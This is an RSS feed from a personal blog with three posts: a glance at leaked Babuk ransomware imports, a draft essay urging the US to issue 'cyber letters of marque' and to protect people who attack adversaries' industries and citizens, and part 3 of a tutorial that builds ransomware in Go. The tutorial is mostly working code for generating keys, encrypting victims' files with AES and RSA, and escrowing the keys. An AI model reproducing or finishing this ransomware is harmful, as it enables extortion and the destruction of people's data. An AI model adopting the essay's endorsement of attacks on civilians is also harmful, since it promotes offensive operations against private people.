<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>tacix.at</title>
    <link>https://tacix.at</link>
    <description>Personal projects in programming and the dark arts..</description>
    <managingEditor> (Taci Xat)</managingEditor>
    <pubDate>Mon, 18 May 2020 12:18:00 -0700</pubDate>
    <lastBuildDate>Sat, 04 Sep 2021 00:48:13 -0700</lastBuildDate>
    <item>
      <title>Babuk Golang Source Code</title>
      <link>https://tacix.at/posts/Babuk Golang Source Code.html</link>
      <description>Taking a look at someone else&#39;s Golang ransomware.</description>
      <content:encoded><![CDATA[<p>Someone leaked the Babuk source code. The Windows and ESXI versions were written in filthy C++, but my surprise when I saw the NAS version was written in Golang! I thought hey, I just wrote some simple ransomware in Go, I should see what the professionals do.</p>

<p>Right off the bat, thing that stands out to me is the use of different cryptography.</p>

<pre><code class="language-golang">import (
	&quot;fmt&quot;
	&quot;io&quot;
	&quot;io/ioutil&quot;
	&quot;os&quot;
	&quot;path/filepath&quot;
	&quot;runtime&quot;
	&quot;strings&quot;
	&quot;sync&quot;

	&quot;crypto/rand&quot;
	&quot;crypto/sha256&quot;

	&quot;golang.org/x/crypto/chacha20&quot;
	&quot;golang.org/x/crypto/curve25519&quot;
)
</code></pre>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Thu, 02 Sep 2021 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>Killington - The Next Decade</title>
      <link>https://tacix.at/posts/Killington - The Next Decade.html</link>
      <description>Wild predictions about the future and some suggestions for how to address them.</description>
      <content:encoded><![CDATA[<p>This post assumes you understand that we are in a long term, low interest rate environment, as well as the unsustainability of <a href="https://en.wikipedia.org/wiki/Triffin_dilemma">being the world&rsquo;s reserve currency</a>. If you are not familiar with these concepts, please review the appendices at the end of the document.</p>

<h2>An Expansionary Period, Goals and Outcomes</h2>

<p>The low interest rates combined with a weaker dollar will create an environment primed for US domestic capability. We can take advantage of this time to benefit the manufacturing base in the United States. This group of workers has been canabalized by the US consistently running trade deficits. We are at a position in the cycle to correct this.</p>

<!-- Additionally, we can position ourselves as the leaders in privacy. Public and private interests working to ensure the right to privacy for our citizens as well as a matter of foreign policy. This begins derisks the current hoards of data on Americans, while also making it patently clear how other govenrments spy on their countrymen. -->

<p>Now is the time to differentiate ourselves, on the world stage, in both software and hardware products. We can go kicking and screaming into the next 10 years, desperately filing sanctions to protect American businesses and the petrodollar, or alternatively, we can change the game that everyone is playing.</p>

<h3>On-Shoring</h3>

<p>Low interest rates and a weak dollar will allow the US to compete internationally on manufacturing. Rather than having a single region be the manufacturing hub of the entire world, and another region be the primary customer, we can bring that capability home and have the end-to-end pipeline within the United States and its neighbors.</p>

<p>This will enable us to on-shore capabilities that were previously unsustainable. This affects the software and hardware supply chain, which is an area that the US can strongly differentiate itself in.</p>

<p>Imagine a situation, such as a kinetic engagement, that caused trade to be cut off from a major manufacturing hub. The number of devices that we have limited to no capability to produce domestically, or even regionally, is astounding. The current environment allows us the opportunity to on-shore these capabilities and create sustainable ecosystems, however we must be willing to foster this.</p>

<h3>Data De-risking</h3>

<p>Data is extremely valuable. A mind numbing amount is collected about us daily. Where we go, who we are with, our interests, preferences, shopping habits, and financials - all are collected and sold by third parties. Online advertising is the primary driver of this collection. While a massive industry, the efficacy in deploying this data is questionable. [TODO CITATION]()</p>

<p>On the other hand, it is a massive security risk for private citizens as well as public interests. China used collected and stolen data in order to discover <a href="https://foreignpolicy.com/2020/12/21/china-stolen-us-data-exposed-cia-operatives-spy-networks/#">CIA agents</a> operating internationally. Data like this has been consistently lost through; the OPM hack, the Experian hack, the [TODO OTHER HIGH PROFILE HACKS].</p>

<p>Data collection is a liability and we must de-risk in this area. If an entity wishes to collect and store data on an individual, we need tight restrictions on its use and severe punishment for its loss. The individual should have a say in their data.</p>

<p>(Anecdote if appropriate: My address history is available online. I have never publicly posted these addresses online. Through some dataset, possibly voting records, credit reporting agencies, or the DMV, all of these are now publicly posted online. This is dangerous for individuals, especially those from vulnerable groups. This information can be used to SWAT people, stalk them, harass them, and provides a springboard to blackmail them.)</p>

<p>(Further if appropriate: Cell phone providers sell our location data in real time. Fuck them too.)</p>

<h3>Offensive Capabilities</h3>

<p>The United States of America leaves a lot of low hanging cyber capabilities shelved. While other countries actively engage in credential phishing, simple document macro attacks, and even Paypal and cryptocurrency scams, the US ignores these avenues of attack.</p>

<p>During capture the flag competitions, teams engage in the practice of chaffing. This is sending large amounts of noise across the shared network, such that another team recording packet captures will have a hard time sifting through that noise to discover the actual exploits being thrown. Cyber policy should take a similar approach. Raise the noise floor with low effort, high impact attacks in order to help mask the more rare high effort, high impact attacks.</p>

<p>These capabilities do not need to originate from the federal government. We simply need to promote and protect individuals who perform these attacks against adversaries, their industries, and citizens. In the same sense that email spam filtering is a growing 800 million dollar industry while no one is making near comparable investment addressing application level, protocol level, or system level design flaws, we want our adversaries to be as hopelessly prioritized. We can achieve this by creating problems for them.</p>

<p><a href="https://www.globenewswire.com/news-release/2019/02/18/1733713/0/en/Global-Enterprise-Spam-Filter-Market-Will-Reach-USD-2-675-Million-By-2026-Zion-Market-Research.html">Citation TODO is this reputable at all?</a></p>

<h3>Payments Infrastructure</h3>

<p>A major impediment to innovation is our current payment infrastructure. We have reached a digital age where we can move data near instantly at minimal cost, however, we have no way to pay a commensurate value for this data. Our online payment options are either embarassingly slow, or charge an effective 3% tax on any transaction. These also include minimum fees to make moving cents, not to mention fractions of a cent, infeasible.</p>

<p>This means that our digital economy is built off of advertising. This infrastructure allows digital properties to be <a href="https://www.investopedia.com/terms/c/cpm.asp">paid per 1000 views</a>. It effectively creates microtransactions, but at the cost of our attention and privacy.</p>

<p>We need a payments infrastructure that enables low fee, instant transactions. The <a href="https://www.frbservices.org/financial-services/fednow/index.html">FedNow</a> project could be this solution. A solution in this space will enable a true digital economy that removes advertisers as the brokers of all transactions and improves citizen privacy.</p>

<p>This will also greatly benefit brick and mortar businesses who are, on every transaction, effectively being charged a 1.3% tax that is paid to the banks and credit card processing companies. <a href="https://www.fool.com/the-ascent/research/average-credit-card-processing-fees-costs-america/">Citation TODO</a></p>

<h3>R&amp;D</h3>

<p>Increase funding in research and development.</p>

<p>An increased focus on transitioning research into products must be made. We should focus on projects that close a small research gap and lean heavily on development.</p>

<h3>New Infrastructure</h3>

<p>[](<a href="https://www.brookings.edu/on-the-record/defending-cyber-dominance/">https://www.brookings.edu/on-the-record/defending-cyber-dominance/</a>)</p>

<p>The Department of Defense understands the importance of a domestic supply chain. There are projects in the DoD that rely on foreign components. Previously we discussed the possibility of events which cut off this supply chain, but we also must consider the attacks which could be staged by an adversary with this level of control. This could mean faulty parts, adversarially planned obsolescence, or even hardware-based backdoors.</p>

<p>We are making effort here. Intel and TSMC are separately creating fabs in Arizona. Recently the DoD has launched an initiative to incentivize domestic chip manufacturing capabilities. This is critical infrastructure and should be prioritized as such.</p>

<p>We also have the opportunity to reduce attack surfaces at this time. While general purpose computing has revolutionized blah blah blah [TODO], it also creates an unmanagable mess. Understanding and managing the security of both the hardware and software stack is nigh untennable. Considering physical and remote attacks, part obsolescence, software aging, known and unknown vulnerabilities, and memory unsafe languages, our devices, infrastructure, and applications are rotting from their core.</p>

<p>We can reduce this attack surface significantly by making purpose built devices, operating systems, and applications. We should not be hobbling together whatever works in order to ship applications that bleed data. We should have low-level developers who understand their stacks such that they can build a system with the capabilities it needs and no more.</p>

<p>Additionally, security engineering could reform as a serious engineering discipline. In the same sense that we can provide tolerances for bridges, we should be able to provide assurances in the entire software supply chain.</p>

<h2>Policy</h2>

<p>Follows are laws and policy considerations for acheiving the above goals, as well as positioning the United States for a prosperous decade.</p>

<h3>Right to Privacy - The 28th Amendment</h3>

<p><em>Citizens shall have the right to control their personal information, from it being posted publically, collected, sold, or transferred.</em></p>

<p>An ammendment should be added to the constitution that guarantees the people&rsquo;s right to privacy.</p>

<h3>Cyber Letters of Marque and Reprisal (LOMAR-C)</h3>

<p>Throughout much of history, privateers were issued authorizations to attack and capture enemy vessels with which their issuing nation was at war. These authorizations laid out territories and rules of engagement for operations on the high seas. The same stance should be taken for cyber operations in order to acheive the goals outlined in Offsensive Capabilities.</p>

<p>These letters could define the nations to target, the goals for operations, and the prize law in the case of incentivized operations.</p>

<p>[](<a href="https://www.cyberlunarium.org/2020/06/cyber-lunarium-commission-001-case-for.html">https://www.cyberlunarium.org/2020/06/cyber-lunarium-commission-001-case-for.html</a>)</p>

<p>[](<a href="https://www.cyberlunarium.org/2020/07/clc004-and-reprisal.html">https://www.cyberlunarium.org/2020/07/clc004-and-reprisal.html</a>)</p>

<h3>Visible Cyber Retaliation</h3>

<p>With the letter of marque and reprisal system the United States will be able to visibly retaliate against cyber attacks, without burning valuable DoD capabilities. For example, the recent North Korean attacks against security researchers do not justify a government response. With the infrastructure of low tier capability, a response could be made simply by dictating attack direction.</p>

<p>[](<a href="https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/">https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/</a>)</p>

<h3>Right to Repair Laws</h3>

<p>(TODO: refine argument so this isn&rsquo;t calling for a regression from ICs)</p>

<p>In rebuilding our manufacturing base and promoting domestic capability, right to repair is essential. Currently, devices are systemizing as black box systems. In purchasing replacement car parts, you&rsquo;re no longer buying individual parts, but a collection of parts (TODO: lookup the industry word for this). Similarly for phones, they are largely unopenable, and the circuit boards are undocumented and difficult to modify. Appliances, such as washing machines are no longer a collection of parts, but a computer that is replaced at a considerably higher cost.</p>

<p>With no documentation for repair, this locks in manufacturing and guarantees a sale to the manufacturing hub. Repair captures the work domestically. It also improves the domestic knowledge base around technical matters.</p>

<h3>Software Assurance Measurements and Standards</h3>

<p>.</p>

<h3>Zero Tolerance on Corporate Weakness to Chinese Soft Power</h3>

<p>.</p>

<h3>Strategically Deploying Sanctions</h3>

<p>.</p>

<h3>Imigration</h3>

<p>Our primary objective is to maintain demand for US citizenship.</p>

<p>Increase immigration to meet the demands of the labor pool in this expansionary phase. This not only helps meet the demand in the cyber talent pool, but will free up citizens for advanced research positions.</p>

<p>In order for US citizens to have a comfortable retirement, they must own assets, and there must be demand for those assets. Given that we do not have enough babies to create this demand domestically, we should all be in favor of immigration. This will increase demand for our assets and ensure a comfortable retirement.</p>

<h3>Education</h3>

<p>An expansionary phase will create a demand for talent. To get the talent that we require, we need to lower the costs of education. This will allow more people to pursue advanced degrees, but it will also free them up to form their own companies after graduation and address economic needs, rather than chasing the highest ad-tech salary they can find.</p>

<p>Considering a paradigm shift in security engineering, we will need to work with universities to prepare students for this level of work. This will mean funding clubs, guiding the curriculum, and setting standards.</p>

<h3>Export Control Reform</h3>

<p>[](<a href="https://www.cnas.org/publications/reports/rethinking-export-controls-unintended-consequences-and-the-new-technological-landscape">https://www.cnas.org/publications/reports/rethinking-export-controls-unintended-consequences-and-the-new-technological-landscape</a>)</p>

<h2>Appendices</h2>

<h3>Appendix A - The Long Term Debt Cycle</h3>

<p>The long term debt cycle is a 50-75 year cycle. Interest rates rise for 15-20 years, they do not stay high, they then descend for 15-20 years, then they remain low for 20-30 years before rising again. It is hard to guage, but looking at 10 year bond yield going back to 1870, we are at the beginning of the bottom. It is likely that interest rates will remain low for the next decade, at least.</p>

<p><a href="https://stooq.com/q/?s=10usy.b&amp;c=mx&amp;t=l&amp;a=lg&amp;b=0">https://stooq.com/q/?s=10usy.b&amp;c=mx&amp;t=l&amp;a=lg&amp;b=0</a></p>

<h4>Implications of Low Interest Rates</h4>

<p>The global equities market has a total market capitalization, as of the end of 2020, of 95 trillion dollars. That is what investors value all publicly traded companies at. By contrast, the global bond market is around 100 trillion. With low interest rates, a significant amount of money is exiting bonds seeking yield.</p>

<p>Prices in the stock market will be driven up as money exits bonds looking for a home. Additionally, cash-flow producing assets will be desirable, e.g. real estate. Most importantly, this will be a time where a large amount of capital will be availble as investments to businesses. This will be an expansionary period in the United States.</p>

<h3>Appendix B - The Petrodollar</h3>

<p><em>This section is largely a (probably historically inaccurate) summary of this <a href="https://www.lynalden.com/fraying-petrodollar-system/">great article</a>. If you have time for the longform, I definitely recommend it.</em></p>

<p>In the early part of the 20th century the US dollar was backed by and redeemable for gold. During the Great Depression, that changed. People were exchanging their dollars for gold in a run on the banks. The US put an emergency halt on this. Continuing on that line, they made ownership of gold illegal and would purchase it from individuals at $20 per ounce. This was the start of the divergence from the gold standard.</p>

<p>Toward the end of WWII, the US controlled two thirds of the world&rsquo;s gold reserves. The <a href="https://en.wikipedia.org/wiki/Bretton_Woods_system">Bretton Woods</a> agreement established the US dollar and gold as the underlying assets in the global financial system.</p>

<p>The global reserve currency must run trade deficits (net importer) to continue supplying other nations with the reserve currecy they require. This is not sustainable, as pointed out by the <a href="https://en.wikipedia.org/wiki/Triffin_dilemma">Triffin Dilemma</a>. Running trade deficits ended up putting more dollars out into the world than the amount of gold the US held could cover at the fixed price of $35 dollars per ounce.</p>

<p>Due to this, Nixon ended the gold standard in the early 1970s. In order to maintain global demand for dollars, the US got <a href="https://en.wikipedia.org/wiki/OPEC">OPEC</a> to agree to only sell oil in US dollars. Hence, the birth of the petrodollar. There is a similar idea under Modern Monetary Theory that taxation is what can give fiat currecy value. An entity&rsquo;s desire to do business in an economy can only be achieved by paying tax in that economy&rsquo;s currency. This creates demand for the currecy. Similarly, on a global stage, to get access to oil you needed US dollars, which stimulated demand for US dollars.</p>

<p>We have benefited from this. Countries want our dollars so they compete on exports in order to get those dollars. Things get cheaper and quality of life improves for those with money. Unfortunately, we still need to run persistent trade deficits to maintain this. This comes at the expense of our manufacturing capabilities. We cannot run deficits forever.</p>

<p>Normally, countries would accumulate dollars then purchase treasuries to park their dollars and gain interest. This was a nice feedback loop into the system, allowing us to print more dollars and continue to run up our trade deficit.</p>

<p>China bucked this trend in 2012. Rather than buying US debt, they started loaning money to other countries for infrastructure projects. This was an investment in assets and trading partners. It does start to break down the petrodollar system though.</p>

<p>The idea here is that the dollar is in a position to weaken, but this is not a bad thing. A weaker dollar means that it will be cheaper for other countries to purchase our goods and services, we can balance our trade out and address the unsustainable deficit.</p>

<p>This may mean the end of the US dollar as the global reserve currency. It will remain important on the world stage, but we may see a shift to regional reserve currencies. Where the full-spectrum of trade could be contained regionally rather than globally.</p>

<h1>Positioning</h1>

<p>Interest rates are low. Use that leverage to acquire some assets that produce cashflow (i.e. real estate).</p>

<p>Investment capital is plentiful. Now is the time to build a business.</p>

<p>Use desperate venture capital to monopolize the cyber talent pool.</p>

<p>Patents around engineering regulation and assurance.</p>

<p>Regulation around tooling and intellectual property.</p>

<p>A major conflict in 10-20 years, at the end of the expansionary phase. Be positioned as a defense contractor to profit.</p>
]]></content:encoded>
      <author>tacixat</author>
      <pubDate>Fri, 25 Dec 2020 13:37:00 -0400</pubDate>
    </item>
    <item>
      <title>The Client - Ransomware in Golang Part 3</title>
      <link>https://tacix.at/posts/The Client - Ransomware in Golang Part 3.html</link>
      <description>We write the wares...</description>
      <content:encoded><![CDATA[<p>We&rsquo;re ready to write the client for our malware! We have the server&rsquo;s keypair and some understand of how to build this, so let&rsquo;s get started.</p>

<p><em>If you haven&rsquo;t seen the other posts, you can follow along from the beginning at <a href="https://tacix.at">tacix.at</a>.</em></p>

<p>Following is a high level sketch of what our client needs to do.</p>

<pre><code class="language-golang">// generate client keypair
// encrypt client private key with server public key
// post encrypted client private key to server (TBD)
// walk target directory
	// at each file
	// generate file key
	// read file
	// encrypt file
	// encrypt file key with client public key
	// store encrypted file key
	// write encrypted data back to file
</code></pre>

<p>Pretty easy! We have already learned most of these things in previous posts. The largest missing piece is encrypting the file. Since our RSA keys can barely encrypt 63 bytes of data, and files can be much larger than 63 bytes, we will need to use something else. For this we will use AES which is a symmetric encryption algorithm.</p>

<h2>Symmetric Encryption with AES</h2>

<p>What we will be doing is generating an AES key for each file, encrypting the file with that, then encrypting that key with the client&rsquo;s public key. So let&rsquo;s figure out how to use AES.</p>

<p>AES is a symmetric encryption algorithm, which means it uses the same key for decryption as it does for encryption. We are going to be using AES in cipher block chaining (CBC) mode. There are 5 modes and <a href="https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb">nerds patronizingly explain them to each other to show that they&rsquo;ve read StackOverflow.</a></p>

<p>What do we need for AES CBC? We need a randomly generated key (secret), a randomly generated initialization vector (IV) (not secret), a plaintext to encrypt (secret), and some padding to make sure the plaintext length is a multiple of the key size. The key and IV are 16 bytes (128 bits). We&rsquo;ll do no padding for this first go.</p>

<pre><code class="language-golang">// scratch/sym.go
package main

import (
	&quot;crypto/aes&quot;
	&quot;crypto/cipher&quot;
	&quot;crypto/rand&quot;
	&quot;fmt&quot;
	&quot;log&quot;
)

func main() {
	// 16 byte buffer for our key
	k := make([]byte, 16)
	// fill buffer with random data
	rand.Read(k)
	fmt.Printf(&quot;k:  %x\n&quot;, k)

	// create a cipher using our key
	blk, err := aes.NewCipher(k)
	if err != nil {
		log.Fatal(err)
	}

	// ditto key but for the IV (also length 16)
	iv := make([]byte, blk.BlockSize())
	rand.Read(iv)
	fmt.Printf(&quot;iv: %x\n&quot;, iv)

	// create our CBC encryptor and decyptor
	enc := cipher.NewCBCEncrypter(blk, iv)
	dec := cipher.NewCBCDecrypter(blk, iv)

	// plaintext
	p := []byte{0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5}
	// ciphertext (same size as plaintext + padding)
	c := make([]byte, len(p))

	// encrypt!
	enc.CryptBlocks(c, p)

	fmt.Printf(&quot;p:  %x\n&quot;, p)
	fmt.Printf(&quot;c:  %x\n&quot;, c)

	// zero the plaintext to check decryption works
	for i := range p {
		p[i] = 0
	}

	// decrypt!
	dec.CryptBlocks(p, c)
	fmt.Printf(&quot;p:  %x\n&quot;, p)
}
</code></pre>

<p>Pretty straight forward. Now we have some fun problems. We need to pad the plaintext when <code>len(p) % block_size != 0</code>. The scheme for this actually also pads it when <code>len(p) % block_size == 0</code> as well, but in that situation it wasn&rsquo;t strictly necessary, it just makes our lives easier.</p>

<p>This padding scheme is from a standard called PKCS#7. It is detailed on <a href="https://datatracker.ietf.org/doc/html/rfc2315#page-21">page 21 of RFC 2315</a>. Basically, we&rsquo;re always going to add padding and we&rsquo;re going to use the number of bytes as the byte value for the padding. For example, if we need 1 byte of padding, we are going to add <code>{0x01}</code> to the end of the plaintext. If we needed two bytes of padding we would add <code>{0x02, 0x02}</code> to the end of the plaintext. If we needed 0 bytes of padding (assuming block size of 16), we would still add padding, in this case, <code>{0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10}</code>. That&rsquo;s sixteen 16s. Why add padding when we don&rsquo;t need any? Well, this way lets us just check the last byte, read that many bytes off the end, verify they are all the same byte, then proceed.</p>

<p>We&rsquo;ll make a little pad function. The <a href="https://en.wikipedia.org/wiki/Modulo_operation">modulo</a> of the block size gives us how many bytes beyond the block size multiple we have. So we really want the difference <code>blocksize - (len(p) % blocksize)</code>.</p>

<pre><code class="language-golang">// scratch/pad.go
package main

import (
	&quot;bytes&quot;
	&quot;fmt&quot;
)

func pad(bs []byte, blksz int) []byte {
	// default to block size
	count := blksz
	// if we have leftover bytes
	if len(bs) % blksz != 0 {
		// difference between blocksize and leftover bytes
		count = blksz  - (len(bs) % blksz)
	}
	// create padding buffer
	padding := bytes.Repeat([]byte{byte(count)}, count)
	// append padding to plaintext
	bs = append(bs, padding...)
	// return bs
	return bs
}

func main() {
	// a quick test
	bs := []byte{0x00,0x11,0x22,0x33,0x44,0x55}
	bs = pad(bs, 16)
	fmt.Printf(&quot;%x\n&quot;, bs)
}
</code></pre>

<h2>The Client</h2>

<p>We&rsquo;ll start out by loading our keys in an <code>init()</code> function. This function runs automatically at the start of the program.</p>

<pre><code class="language-golang">// client/main.go
package main

import (
	&quot;crypto/rand&quot;
	&quot;crypto/rsa&quot;
	&quot;crypto/x509&quot;
	&quot;log&quot;
	&quot;math/big&quot;
)

var clientKey *rsa.PublicKey
var serverKey *rsa.PublicKey
var serverKeyBytes = []byte{
	0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01,
	0x00, 0xb4, 0x10, 0x46, 0xf7, 0x7e, 0x73, 0x72,
	0x22, 0x4a, 0xcf, 0x98, 0xc8, 0x60, 0x67, 0x6c,
	0x96, 0x0b, 0xf9, 0x42, 0x5d, 0x05, 0xbf, 0x99,
	0x96, 0xe8, 0x69, 0xed, 0x95, 0xa4, 0x95, 0xbb,
	0xd2, 0x62, 0xa5, 0x35, 0x77, 0x97, 0x19, 0xc7,
	0x09, 0x92, 0x61, 0xd9, 0x5f, 0xea, 0x3e, 0x49,
	0xf5, 0x3f, 0x6f, 0x84, 0x21, 0x94, 0xc9, 0xda,
	0xfd, 0x20, 0x62, 0xc4, 0x61, 0x7c, 0x86, 0xfc,
	0xd6, 0x1f, 0xc8, 0x35, 0x2a, 0x78, 0xd5, 0x3e,
	0xb8, 0xd3, 0x3b, 0xa7, 0x3c, 0x9e, 0x82, 0x55,
	0xe3, 0x5b, 0x5c, 0x82, 0x50, 0xa5, 0x06, 0xf4,
	0x42, 0xfe, 0x93, 0xad, 0x61, 0x80, 0xff, 0xf2,
	0x8e, 0xe3, 0x78, 0xcb, 0xec, 0x91, 0x3f, 0x40,
	0xae, 0x71, 0x1f, 0x50, 0xb3, 0x1c, 0x1e, 0xdc,
	0x99, 0xed, 0xbb, 0x33, 0xe4, 0x6c, 0xb4, 0x84,
	0x18, 0x87, 0x51, 0xc7, 0x42, 0x0e, 0xa5, 0x80,
	0x4c, 0x36, 0xd2, 0xf2, 0x52, 0x58, 0x08, 0x26,
	0x6c, 0x36, 0x4b, 0x15, 0x22, 0x91, 0xd1, 0x92,
	0xcb, 0x82, 0x0f, 0xa8, 0x3f, 0xbe, 0x57, 0x2a,
	0xd0, 0xf2, 0x51, 0xa6, 0x3c, 0x92, 0xb9, 0x00,
	0x25, 0x23, 0xf4, 0x48, 0xa4, 0x8f, 0x09, 0xb4,
	0x5f, 0x42, 0x3f, 0x7d, 0x2d, 0xf8, 0xb0, 0x61,
	0x03, 0xcc, 0x93, 0x29, 0x63, 0x6a, 0xce, 0x1c,
	0x3f, 0x19, 0x7b, 0x03, 0x13, 0xd2, 0xd9, 0x99,
	0x85, 0x55, 0x2c, 0xfa, 0x19, 0x92, 0x18, 0x8a,
	0x39, 0x57, 0x4e, 0x22, 0xa3, 0x39, 0x93, 0xaa,
	0x5b, 0xaa, 0x2f, 0x2a, 0x41, 0xcb, 0xb6, 0xbc,
	0xde, 0x29, 0xe1, 0xbf, 0x4b, 0xbb, 0xac, 0x38,
	0x00, 0x1b, 0x4f, 0xb8, 0x4f, 0x39, 0xf6, 0xb0,
	0x0d, 0x92, 0x49, 0x0b, 0x60, 0x25, 0x15, 0xd2,
	0xad, 0xfa, 0x56, 0xb1, 0x0a, 0x94, 0xfc, 0xdc,
	0x55, 0xb9, 0x52, 0xe6, 0x64, 0x93, 0x85, 0x36,
	0x23, 0x02, 0x03, 0x01, 0x00, 0x01}

func init() {
	var err error
	serverKey, err = x509.ParsePKCS1PublicKey(serverKeyBytes)
	if err != nil {
		log.Fatal(err)
	}

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &amp;rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv := x509.MarshalPKCS1PrivateKey(clientPrv)
	log.Println(encodedPrv)

	// encrypt client prv
	// write encrypted client prv to file
}

func main() {
	log.Println(clientKey)
	log.Println(serverKey)
}
</code></pre>

<p>With our server key loaded and client key generated, we need to now encrypt the client key and store it. This will be provided to the server for decryption.</p>

<p>To do this, we can use the same encryption scheme we would for other files. That is, we will generate a symmetric key for the file, encrypt the file, encrypt that symmetric key with the server&rsquo;s public key, store that information. We will create a helper function <code>zero()</code> to clear key data from memory.</p>

<pre><code class="language-golang">// overwrite data in memory
func zero(bs []byte) {
	for i := range bs {
		bs[i] = 0x41
	}
}

func pad(bs []byte, blksz int) []byte {
	count := blksz
	if len(bs) % blksz != 0 {
		count = blksz  - (len(bs) % blksz)
	}

	padding := bytes.Repeat([]byte{byte(count)}, count)
	bs = append(bs, padding...)
	return bs
}

func encryptHybrid(rsaKey *rsa.PublicKey, bs []byte) ([]byte, []byte) {
	// generate symmetric key
	k := make([]byte, 16)
	rand.Read(k)

	// make cipher
	blk, err := aes.NewCipher(k)
	if err != nil {
		log.Fatal(err)
	}

	// pad plaintext
	bs = pad(bs, blk.BlockSize())
	
	// make iv
	iv := make([]byte, blk.BlockSize())
	rand.Read(iv)

	// encrypt plaintext with symmetric key
	enc := cipher.NewCBCEncrypter(blk, iv)
	enc.CryptBlocks(bs, bs)

	// append iv to ciphertext
	enc = append(enc, iv...)

	// encrypt symmetric key with asymmetric key
	ek, err := rsa.EncryptOAEP(
		sha256.New(), rand.Reader, rsaKey, k, nil)
	if err != nil {
		log.Fatal(err)
	}

	// clear unencrypted key
	zero(k)

	return ek, bs
}
</code></pre>

<p>After calling <code>encryptHybrid()</code> we will have the ciphertext with IV, and the encrypted symmetric key that use used to encrypt the ciphertext. The encrypted symmetric key is encrypted with the provided RSA public key. We can now extend our <code>init()</code> function to use this. Also introduced is a function <code>rmifex()</code> which will remove a file if it exists.</p>

<p>We&rsquo;ll store the encrypted client private key in a file <code>master.key</code>. This file will be posted to the server because, despite what ransomware victims who end up paying believe, backups are important.</p>

<pre><code class="language-golang">func init() {
	var err error
	serverKey, err = x509.ParsePKCS1PublicKey(serverKeyBytes)
	if err != nil {
		log.Fatal(err)
	}

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &amp;rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv := x509.MarshalPKCS1PrivateKey(clientPrv)
	log.Println(encodedPrv)

	encyptedPrv, encSymKey := encryptHybrid(serverKey, encodedPrv)

	// write encrypted client prv to file
	rmifex(&quot;master.key&quot;)
	err = ioutil.WriteFile(&quot;master.key&quot;, encryptedPrv, 0444)
	if err != nil {
		log.Fatal(err)
	}

	// store encrytped symmetric key 

	zero(encodedPrv)
}

func rmifex(path string) {
	_, err := os.Stat(path)
	if err == nil {
		err := os.Remove(path)
		if err != nil {
			log.Fatal(err)
		}
	}
}
</code></pre>

<p>Now we need to store all the symmetric keys used for encrypting files somewhere. Rather than storing this with each file, we are going to store them in one convenient location. This is going to be a JSON file, <code>keys.json</code>, containing a list of objects. The objects will have the path of the file, and the corresponding symmetric key for that file. The symmetric keys will all be encrypted with the client&rsquo;s public key, with the one exception of the first entry. That entry will be for <code>master.key</code> which is encrypted with the server&rsquo;s public key.</p>

<p>To decrypt everything we will send the first entry and <code>master.key</code> to the server. The server will decrypt the symmetric key, then use that to decrypt the client&rsquo;s private key stored in <code>master.key</code>. The client&rsquo;s private key can then be packaged in a decryptor to decrypt the remaining entries in <code>keys.json</code>. Once those entries are decrypted, the symmetric keys can be applied to the original files.</p>

<pre><code class="language-golang">type EncryptionInfo struct {
	Path string `json:&quot;path&quot;`
	Key  []byte `json:&quot;key&quot;`
}

type EncryptionInfos []EncryptionInfo

var eis EncryptionInfos
</code></pre>

<p>With that, we can finalize our <code>init()</code> function. We remove <code>keys.json</code> if it exists. We store the one encryption info structure for <code>master.key</code> in our slice, and then we zero out the client&rsquo;s private key in memory.</p>

<pre><code class="language-golang">func init() {
	var err error
	serverKey, err = x509.ParsePKCS1PublicKey(serverKeyBytes)
	if err != nil {
		log.Fatal(err)
	}

	clientPrv, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		log.Fatal(err)
	}

	n := big.NewInt(0)
	n.SetBytes(clientPrv.PublicKey.N.Bytes())
	clientKey = &amp;rsa.PublicKey{
		N: n,
		E: clientPrv.PublicKey.E,
	}

	encodedPrv := x509.MarshalPKCS1PrivateKey(clientPrv)
	log.Println(encodedPrv)

	encryptedPrv, encSymKey := encryptHybrid(serverKey, encodedPrv)

	rmifex(&quot;master.key&quot;)
	err = ioutil.WriteFile(&quot;master.key&quot;, encryptedPrv, 0444)
	if err != nil {
		log.Fatal(err)
	}

	rmifex(&quot;keys.json&quot;)
	eis = append(eis, EncryptionInfo{
		Path: &quot;master.key&quot;,
		Key: encSymKey,
	})

	zero(encodedPrv)
	clientPrv.D.SetInt64(0)
	for i := range clientPrv.Primes {
		clientPrv.Primes[i].SetInt64(0)
	}
}
</code></pre>

<p>This is the bulk of our ransomware! We just need to tie it into main and a walker function, both of which we know how to do. Our main function will start walking. I&rsquo;m going to use a hardcoded path so I don&rsquo;t stomp something on my host. After our program has taken an belligerent stroll through the filesystem, we&rsquo;ll marshal our encryption info slice <code>eis</code> to JSON then write that to a file.</p>

<pre><code class="language-golang">func main() {
	err := filepath.Walk(
		&quot;C:\\Users\\tacixat\\prog\\ransomware\\victim&quot;, walker)
	if err != nil {
		log.Fatal(&quot;Error walking:&quot;, err)
		return
	}

	data, err := json.Marshal(eis)
	if err != nil {
		log.Fatal(err)
	}

	err = ioutil.WriteFile(&quot;file.keys&quot;, data, 0444)
	if err != nil {
		log.Fatal(err)
	}
}
</code></pre>

